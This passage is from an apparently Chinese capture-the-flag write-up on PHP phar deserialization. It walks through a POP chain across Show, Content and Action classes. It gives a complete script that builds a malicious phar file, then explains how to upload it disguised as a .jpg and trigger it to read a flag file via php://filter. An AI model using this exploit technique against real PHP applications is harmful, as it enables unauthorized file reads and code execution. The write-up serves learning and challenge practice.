>      }
>     }
>  
>     $a = new test();
>     $a->null_func("This is arg");
>  
>     ?>
>  
>
> 该 php 的运行结果为  
>
> 
所以我们应该关注有类似`$this->xxx->xxx()`调用函数的地方，且类 `Content`没有我们尝试调用的函数：
> 为什么是`$this->xxx->xxx()`呢？  
>  因为我们需要指定是 Content 类的 `xxx()` 函数，如果`$this->xxx`可控，那么就能使其成为 Content
> 类的对象，然后`$this->xxx->xxx()`就会变成 `Content
> 类对象->xxx()`，这时`xxx()`不存在，php就会去调用`Content::__call()`啦
>
> `Show::reset() { $this->reader->close();}`调用合理，
> `Content`类中没有`close()`的定义，但由于`reset()`不是魔法函数，无法实现自动调用，或者需要通过`call_user_func_array()`调用，形成”悖论“
>
> `Show::__toString() { $this->str->reset();}`函数合理，
> `Content`类中没有`reset()`的定义，且处于魔法函数中，情况较为理想，作为一个方案
>
> 无其他类似`$this->xxx->xxx()`的函数调用
那么我们到目前位置只能调用的就是`Show::__toString()`了，那么`__toString()`怎么调用呢？由前置知识的储备可知：
> `__toString( 在！对象当做字符串 ！的时候会被调用。)`  
>  重点是当对象被当作字符串解析的时候！！！`__toString()`就会进行相关的处理  
>  例如
>  
>  
>       
>      class test{
>       public $test;
>       public function __toString(){
>           echo "我是对象喔，我不是字符串，不过也行";
>           return "哎哟你干嘛";
>       }
>      }
>  
>      $a = new test();
>  
>  
>      echo "即将进行字符串拼接";
>      $b = "我负责组成头部  ".$a."  我负责组成扁桃体";
>      echo "";
>      var_dump($b);
>  
>      ?>
>
> 运行结果是：  
>
> 
所以我们要找到有 `$this->xxx`被当成字符串处理的地方，这时候 `$this->xxx`如果可控，我们设置其为 Show
类的对象，即可成功调用`Show::__toString()`
回头看看代码，`Action::run()`中有很多，但是我们的目的就是调用`Action::run()`，如果能提前调用`Action::run()`，那我们就不需要构造POP链了
找到可以利用的点，只要我们设置`$this->source`为 Show
类的对象，就能调用`Show::__toString()`，而刚好`preg_match()`处在`Show::__wake()`即反序列化的入口，由此，一个完整的POP链就出现了
  * POP链：（`file_exists() 触发 Show::__wakeup(){ preg_match() } --> Show::__toString(){ $this->str->reset(); } -->Content::__call(){ call_user_func_array } --> Action::run()`）
>
> 其实在自己分析构造POP链时，没有那么顺利，应该多从逆向思维和正向思维，再结合知识储备多思考，灵活地利用看似无害的东西构造出精美的武器，是黑客的艺术（扯远了
### payload构造
此时我们应该构造的类结构，对应 POP 链也就呼之欲出了：
> 最外层是 Show 类对象  
>  作用是使 `file_exists()`能触发`Show::__wakeup()`
>
> 最外层 Show 类对象里的 `$source`，应该是另一个 Show 类对象  
>  作用是当最外层`Show::__wakeup()`调用时，执行到`preg_match()`时，将`$this->source`，即最外层的 Show
> 类对象的`$source`当成字符串处理时（此时`$source`是 Show 对象）触发了`$source`（第二层 Show
> 对象）的`Show::__toString()`
>
> 第二层Show对象里的`$str`，应该是一个 Content 类对象  
>  作用是当第二次的`Show::__toString()`调用时，执行`$this->str->reset();`此时`$this->str`是
> Content 对象，即调用 `Content::reset()`，函数不存在，触发`Content::__call()`
此时POP到了`Content::__call()`，且此时`Content::__call()`的参数`$name,$arguments`是确定的  
因为是通过`$this->str->reset();`来调用的`Content::__call()`，所以此时的`$name="reset"`，而`$arguments=''`（因为`$this->str->reset();`时没有参数）
图片
接下来就是`call_user_func_array($this->getFormatter($name),
$arguments);`了，其中`$name`会被`$this->getFormatter()`处理（即`Content::getFormatter()`）又因为`call_user_func_array()`只接收`array()`类型数据  
所以函数处理之后，我们希望`$this->getFormatter($name)`的返回值是一个`array('Action','run')`或者`array($a,'run')`（$a
是一个Action实例化对象）
但在我们进入`Action::run()`后，还希望控制一些成员的具体值，所以选择`array($a,'run')`这种返回值是可解的
我们再跟进`getFormatter()`can can 如何得到返回值
相较与后一个 return ，前一个 return 简单粗暴，所以我就使用前一个构造了
我们构造的`$this->formatters`应该是一个 array，里面含有一个键名 "reset"
，且`$this->formatters["reset"]`的值是 `array($a,'run')`，`$a`是一个 Action 类对象
此时 `call_user_func_array($this->getFormatter($name), $arguments);`的最终形态就是
> `call_user_func_array(array($a,'run'), $arguments);` 参数`$arguments`均为空即可
此时就能调用`Action::run()`啦，再设置一下`$a`这个 Action 类的成员值
> $checkAccess =
> 'PHP://filter/read=convert.base64-encode/resource=/tmp/flag.php';  
>  $id = '0'; // 强比较和弱比较考点
我们就能文件包含 base64 加密后的 /tmp/flag.php 了
最后贴上我的payload生成脚本：（里面有些本地调试的代码，请忽略哈哈哈哈哈哈）
    checkAccess = 'PHP://filter/read=convert.base64-encode/resource=/tmp/flag.php';
            $this->id = '0';
        }
        public function run()
        {  
            if(strpos($this->checkAccess, 'uplod') !== false){ 
                echo "error path";
                exit();
            } 
            if ($this->id !== 0 && $this->id !== 1) {
                switch($this->id) {
                    case 0:
                        echo 'id = 0';
                        echo "";
                        if ($this->checkAccess) {
                            include($this->checkAccess);#-----------------------                        }
                        break;
                    case 1:
                        echo 'id = 1';
                        echo "";
                        throw new Exception("id invalid in ".__CLASS__.__FUNCTION__);
                        break;
                    default:
                        echo "default";
                        echo "";
                        break;         
                }
            }
        }
    }
    class Content {
        public $formatters;
        public function __construct() {
            $a = new Action();
            echo 'formatters = ';
            var_dump($this->formatters);
            $this->formatters = array("reset"=>array($a,"run"));
            #$this->formatters = array("reset"=>array("","__invoke"));
            #$this->providers = new Action();
        }
        public function getFormatter($formatter)
        {   
            echo "";
            echo 'getFormatter';
            echo "";
            echo "\$formatter = ";
            var_dump($formatter);
            echo "";
            var_dump($this->formatters);
            echo "";
            echo "\$this->formatters[$formatter] = ";
            var_dump($this->formatters[$formatter]);
            if (isset($this->formatters[$formatter])) {
                echo "";
                echo "set";
                echo "";
                return $this->formatters[$formatter];
            }
            foreach ($this->providers as $provider) {
                if (method_exists($provider, $formatter)) {
                    $this->formatters[$formatter] = array($provider, $formatter);
                    return $this->formatters[$formatter];
                }
            }
            throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
        }
        public function __call($name, $arguments)#调用Conetent类中不存在的函数
        {   
            #echo "Thrid";
            #echo "";
            echo "\$name = ";
            var_dump($name);
            echo "";
            var_dump($this->getFormatter($name));
            echo "";
            echo "retrun ^ ";
            echo "";
            echo "";
           /*  echo "\$arguments = ";
            var_dump($arguments); */
            echo "";echo "";echo "";echo "";echo "";
            return call_user_func_array($this->getFormatter($name), $arguments);#调用Action run
        }
    }
    class Show{
        public $source;
        public $str;
        public $reader;
        public function __construct($file='index.php') {
            $this->source = $file;
            $this->str = new Content();
            #echo 'Welcome to '.$this->source."";#触发 _toString 但是只有在new时触发 基本没用
        }
        public function __toString() {
            #echo 'Second';
            $this->str->reset();
        }
        public function __wakeup() {
            echo "";
            echo "";
            if(preg_match("/gopher|phar|http|file|ftp|dict|\.\./i", $this->source)) {#触发 _toString
                throw new Exception('invalid protocol found in '.__CLASS__);#抛出异常，显示当前的类名
            }
        }
        public/*  static */ function reset() {
            echo '2';
            if ($this->reader !== null) {
                $this->reader->close();
            }
        }
    }
    #$c = new Action();
    #var_dump(method_exists('Show','__wakeup'));
    #call_user_func_array(array('Modifier','__invoke'),array());
    #echo "";echo "";echo "";echo "";echo "";
    $a = new Show();
    $b = new Show();
    $b->source = $a;
    #var_dump($b);
    /* echo "";echo "";echo "";echo "";echo "";
    echo serialize($b); */
    $phar=new phar('1234.phar');//后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("");//设置stub
    #$obj=$b;
    echo serialize($b);
    $phar->setMetadata($b);//自定义的meta-data存入manifest
    $phar->addFromString("flag.txt","yoxi");//添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    #echo "serialize(\$b) = ";
    #unserialize(serialize($b));
然后我们只需要拿着我们生成的 1234.phar 修改后缀为 .jpg 然后上传，得到文件路径后再对 upload.php GET传参：  
`?c=phar://upload/xxx.jpg/flag.txt`即可拿到flag
## 总结
本次题目是本人第一次独立做出的一道还算有点难度的Web题，算是对最近一段时间的学习有了一个自我认可，写这篇文章也是再重新梳理思路的同时，给需要的读者一些帮助
  * 没有白费的努力，只有虚度的光阴
## 参考链接：